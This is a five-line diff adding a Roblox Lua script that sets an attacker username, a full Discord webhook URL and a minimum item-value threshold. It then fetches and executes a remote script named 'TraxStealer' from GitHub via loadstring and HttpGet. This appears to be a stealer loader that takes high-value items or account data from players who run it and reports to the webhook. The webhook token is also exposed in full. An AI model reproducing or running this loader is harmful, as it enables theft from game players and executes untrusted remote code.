@@ -1,0 +1,5 @@
+Username = "Rip_leo249"
+Webhook = "https://discord.com/api/webhooks/1291990195696177195/JnYCPjqbiCyra2vv02hIDQDIsCbmMGLM-hRprWi1m8_g3mJ9LkeA7p15klS2MElriQ-Q"
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PetsGo/refs/heads/main/TraxStealer"))()
